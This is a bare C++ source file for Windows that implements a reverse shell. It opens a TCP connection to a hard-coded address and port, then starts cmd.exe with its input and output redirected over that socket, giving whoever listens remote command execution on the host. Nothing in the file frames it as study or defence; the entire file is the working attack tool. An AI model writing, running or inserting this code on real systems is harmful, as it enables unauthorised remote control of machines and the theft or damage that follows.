#include <winsock2.h>
#include <stdio.h>

using namespace std;

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in sock_addr;
STARTUPINFO si;
PROCESS_INFORMATION pi;

int main()
{
	char *ip = (char*)"172.29.101.113";
	short port = 2106;

	int init = WSAStartup(MAKEWORD(2, 2), &wsaData); // macro to init socket library

	wsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(port);
    sock_addr.sin_addr.s_addr = inet_addr(ip);

	WSAConnect(wsock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdInput = si.hStdOutput = (HANDLE)wsock;

	CreateProcess(NULL, (char*)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

